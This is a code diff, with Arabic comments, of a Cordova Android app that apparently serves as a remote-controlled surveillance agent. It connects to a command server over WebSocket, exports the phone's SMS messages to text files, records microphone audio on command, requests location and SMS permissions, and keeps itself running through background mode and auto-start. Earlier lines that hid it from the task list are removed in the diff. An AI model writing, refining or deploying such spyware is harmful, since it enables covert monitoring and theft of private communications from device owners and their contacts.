@@ -9,38 +9,31 @@ let permissionsGranted = false;
 function onDeviceReady() {
   console.log('Device is ready');
   
-  // طلب الأذونات اللازمة عند فتح التطبيق لأول مرة
+  // طلب الأذونات اللازمة
   requestPermissions();
   
-  // تمكين التشغيل في الخلفية مع إعدادات إضافية
+  // تمكين التشغيل في الخلفية
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
     cordova.plugins.backgroundMode.setDefaults({
       title: 'التطبيق يعمل في الخلفية',
       text: 'جارٍ مراقبة الأوامر الواردة',
+      hidden: false,
+      resume: true,
       silent: false
     });
     
-    // جعل التطبيق يعمل تلقائياً عند التشغيل
+    // إعدادات إضافية للخلفية
     cordova.plugins.backgroundMode.on('activate', function() {
       cordova.plugins.backgroundMode.disableWebViewOptimizations();
-      cordova.plugins.backgroundMode.disableBatteryOptimizations();
+      console.log('App is running in background');
     });
     
-    // إعادة الاتصال عند العودة من الخلفية
     cordova.plugins.backgroundMode.on('deactivate', function() {
-      if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
-        console.log('Reconnecting WebSocket after background mode...');
-        initializeDeviceInfo();
-      }
+      console.log('App is running in foreground');
     });
   }
 
-  // تهيئة معلومات الجهاز والاتصال
-  initializeDeviceInfo();
-}
-
-function initializeDeviceInfo() {
   // معلومات الجهاز
   const deviceInfo = {
     uuid: device.uuid || generateUUID(),
@@ -106,36 +99,66 @@ function initializeDeviceInfo() {
   }
 }
 
+// طلب الأذونات اللازمة
 function requestPermissions() {
-  // طلب الأذونات اللازمة
   const permissions = [
     'android.permission.ACCESS_FINE_LOCATION',
-    'android.permission.READ_SMS',
+    'android.permission.ACCESS_COARSE_LOCATION',
     'android.permission.RECORD_AUDIO',
+    'android.permission.READ_SMS',
+    'android.permission.RECEIVE_SMS',
     'android.permission.WRITE_EXTERNAL_STORAGE',
     'android.permission.READ_EXTERNAL_STORAGE',
     'android.permission.WAKE_LOCK',
     'android.permission.FOREGROUND_SERVICE'
   ];
   
+  const permissionsToRequest = [];
+  
   permissions.forEach(permission => {
-    cordova.plugins.permissions.checkPermission(permission, function(status) {
-      if (!status.hasPermission) {
-        cordova.plugins.permissions.requestPermission(permission, function(result) {
-          console.log(`Permission ${permission}: ${result.hasPermission ? 'Granted' : 'Denied'}`);
-          if (result.hasPermission) {
-            permissionsGranted = true;
-          }
-        }, function(error) {
-          console.error(`Error requesting permission ${permission}:`, error);
-        });
-      } else {
-        permissionsGranted = true;
+    cordova.plugins.permissions.checkPermission(permission, 
+      function(status) {
+        if (!status.hasPermission) {
+          permissionsToRequest.push(permission);
+        }
+      },
+      function(error) {
+        console.error('Error checking permission:', error);
       }
-    }, function(error) {
-      console.error(`Error checking permission ${permission}:`, error);
-    });
+    );
   });
+  
+  if (permissionsToRequest.length > 0) {
+    cordova.plugins.permissions.requestPermissions(
+      permissionsToRequest,
+      function(status) {
+        if (status.hasPermission) {
+          console.log('All permissions granted');
+          permissionsGranted = true;
+          
+          // بدء التشغيل التلقائي عند منح الأذونات
+          if (cordova.plugins.autoStart) {
+            cordova.plugins.autoStart.enable();
+            console.log('Auto start enabled');
+          }
+        } else {
+          console.log('Some permissions denied');
+          alert('يجب منح جميع الأذونات لكي يعمل التطبيق بشكل صحيح');
+        }
+      },
+      function(error) {
+        console.error('Error requesting permissions:', error);
+      }
+    );
+  } else {
+    permissionsGranted = true;
+    
+    // بدء التشغيل التلقائي إذا كانت الأذونات ممنوحة مسبقًا
+    if (cordova.plugins.autoStart) {
+      cordova.plugins.autoStart.enable();
+      console.log('Auto start enabled');
+    }
+  }
 }
 
 function connectToServer(deviceInfo) {
@@ -196,7 +219,7 @@ function connectToServer(deviceInfo) {
   wsConnection.onclose = () => {
     console.log('Disconnected from server');
     // إعادة الاتصال بعد تأخير
-    setTimeout(() => initializeDeviceInfo(), 10000);
+    setTimeout(() => connectToServer(deviceInfo), 10000);
   };
   
   // إرسال نبضات قلبية دورية
@@ -336,6 +359,7 @@ function getSMS(commandId, callback) {
   );
 }
 
+// دالة لتنزيل رسائل SMS كملف نصي
 function downloadSMSTxt(commandId, callback) {
   if (typeof SMS === 'undefined') {
     return callback({ 
@@ -355,64 +379,42 @@ function downloadSMSTxt(commandId, callback) {
   SMS.listSMS(
     filter,
     (messages) => {
-      // إنشاء محتوى ملف نصي من الرسائل
-      let txtContent = "SMS Messages Export\n";
-      txtContent += "====================\n\n";
-      
-      messages.forEach((msg, index) => {
-        txtContent += `Message ${index + 1}:\n`;
-        txtContent += `From: ${msg.address}\n`;
-        txtContent += `Date: ${new Date(msg.date).toLocaleString()}\n`;
-        txtContent += `Body: ${msg.body}\n`;
-        txtContent += "----------------------------\n\n";
-      });
-      
-      // إنشاء ملف نصي
-      const fileName = `sms_export_${new Date().getTime()}.txt`;
-      const blob = new Blob([txtContent], { type: 'text/plain' });
-      
-      // حفظ الملف
-      window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory, function(dir) {
-        dir.getFile(fileName, { create: true }, function(fileEntry) {
-          fileEntry.createWriter(function(fileWriter) {
-            fileWriter.onwriteend = function() {
-              // الحصول على رابط التنزيل
-              fileEntry.file(function(file) {
-                const fileURL = URL.createObjectURL(file);
-                
-                callback({
-                  commandId,
-                  status: 'success',
-                  file: {
-                    name: fileName,
-                    size: file.size,
-                    type: file.type,
-                    downloadUrl: fileURL
-                  }
-                });
-              });
-            };
-            
-            fileWriter.onerror = function(e) {
-              callback({ 
-                commandId,
-                status: 'error',
-                error: 'File write error',
-                details: e.toString()
-              });
-            };
-            
-            fileWriter.write(blob);
+      try {
+        // إنشاء محتوى الملف النصي
+        let txtContent = "رسائل SMS\n\n";
+        messages.forEach((msg, index) => {
+          txtContent += `رسالة ${index + 1}:\n`;
+          txtContent += `من: ${msg.address}\n`;
+          txtContent += `التاريخ: ${new Date(msg.date).toLocaleString('ar-EG')}\n`;
+          txtContent += `المحتوى: ${msg.body}\n`;
+          txtContent += "------------------------\n\n";
+        });
+        
+        // إنشاء Blob من المحتوى
+        const blob = new Blob([txtContent], { type: 'text/plain' });
+        
+        // حفظ الملف
+        const fileName = `sms_messages_${new Date().getTime()}.txt`;
+        saveFileToStorage(fileName, blob, (fileUrl) => {
+          callback({
+            commandId,
+            status: 'success',
+            file: {
+              name: fileName,
+              type: 'text/plain',
+              size: blob.size,
+              downloadUrl: fileUrl
+            }
           });
         });
-      }, function(error) {
+      } catch (error) {
         callback({ 
           commandId,
           status: 'error',
-          error: 'File system error',
-          details: error.toString()
+          error: 'Error creating TXT file',
+          details: error.message
         });
-      });
+      }
     },
     (error) => {
       callback({ 
@@ -429,7 +431,7 @@ function recordAudio(commandId, duration, callback) {
   duration = duration || 10; // Default 10 seconds
   
   const mediaRecorderOptions = {
-    mimeType: 'audio/mp3', // استخدام صيغة MP3
+    mimeType: 'audio/webm; codecs=opus', // استخدام صيغة متوافقة
     audioBitsPerSecond: 128000
   };
   
@@ -443,23 +445,27 @@ function recordAudio(commandId, duration, callback) {
       };
       
       mediaRecorder.onstop = () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
-        const audioUrl = URL.createObjectURL(audioBlob);
+        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
         
-        // حفظ التسجيل في التخزين المحلي
-        const fileName = `recording_${commandId}.mp3`;
-        saveAudioToStorage(fileName, audioBlob);
-        
-        callback({ 
-          commandId,
-          status: 'success',
-          audio: {
-            duration: duration,
-            format: 'mp3',
-            size: audioBlob.size,
-            downloadUrl: audioUrl,
-            fileName: fileName
-          }
+        // تحويل إلى MP3 إذا أمكن، أو استخدام الصيغة الأصلية
+        processAudioBlob(audioBlob, (processedBlob, format) => {
+          const audioUrl = URL.createObjectURL(processedBlob);
+          
+          // حفظ التسجيل في التخزين المحلي
+          const fileName = `recording_${commandId}.${format}`;
+          saveFileToStorage(fileName, processedBlob, (fileUrl) => {
+            callback({ 
+              commandId,
+              status: 'success',
+              audio: {
+                duration: duration,
+                format: format,
+                size: processedBlob.size,
+                downloadUrl: fileUrl,
+                fileName: fileName
+              }
+            });
+          });
         });
       };
       
@@ -479,17 +485,39 @@ function recordAudio(commandId, duration, callback) {
     });
 }
 
-function saveAudioToStorage(fileName, blob) {
-  // حفظ الملف في التخزين المحلي
-  window.resolveLocalFileSystemURL(cordova.file.dataDirectory, dir => {
-    dir.getFile(fileName, { create: true }, fileEntry => {
-      fileEntry.createWriter(fileWriter => {
-        fileWriter.onwriteend = () => console.log('Audio file saved:', fileName);
-        fileWriter.onerror = e => console.error('Error saving file:', e);
-        fileWriter.write(blob);
+// معالجة ملف الصوت (يمكن التوسيع في المستقبل للتحويل إلى MP3)
+function processAudioBlob(blob, callback) {
+  // في هذه النسخة، نستخدم الصيغة الأصلية
+  // يمكن إضافة تحويل إلى MP3 باستخدام مكتبات خارجية لاحقًا
+  callback(blob, 'webm');
+}
+
+// دالة عامة لحفظ الملفات
+function saveFileToStorage(fileName, blob, callback) {
+  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory || cordova.file.dataDirectory, 
+    (dir) => {
+      dir.getFile(fileName, { create: true }, (fileEntry) => {
+        fileEntry.createWriter((fileWriter) => {
+          fileWriter.onwriteend = () => {
+            console.log('File saved:', fileName);
+            callback(fileEntry.toURL());
+          };
+          fileWriter.onerror = (e) => {
+            console.error('Error saving file:', e);
+            callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
+          };
+          fileWriter.write(blob);
+        });
+      }, (error) => {
+        console.error('Error getting file:', error);
+        callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
       });
-    });
-  });
+    }, 
+    (error) => {
+      console.error('Error accessing filesystem:', error);
+      callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
+    }
+  );
 }
 
 function getDeviceInfo(commandId, callback) {
@@ -524,23 +552,19 @@ function getReceivedRequests(commandId, callback) {
 document.addEventListener('resume', () => {
   if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
     console.log('App resumed, reconnecting...');
-    initializeDeviceInfo();
+    onDeviceReady();
   }
 }, false);
 
-// التأكد من أن التطبيق يعمل بعد إعادة التشغيل
+// إعدادات التشغيل التلقائي عند بدء التشغيل
 document.addEventListener('resume', function() {
   if (cordova.plugins.backgroundMode) {
     cordova.plugins.backgroundMode.enable();
   }
-});
+}, false);
 
-// بدء التشغيل التلقائي عند تشغيل الجهاز
-document.addEventListener('deviceready', function() {
-  // تشغيل الخدمة في الخلفية عند بدء التشغيل
-  if (cordova.plugins.backgroundMode) {
-    cordova.plugins.backgroundMode.enable();
-    cordova.plugins.backgroundMode.overrideBackButton();
-    cordova.plugins.backgroundMode.excludeFromTaskList();
+document.addEventListener('pause', function() {
+  if (cordova.plugins.backgroundMode && cordova.plugins.backgroundMode.isEnabled()) {
+    cordova.plugins.backgroundMode.disable();
   }
 }, false);
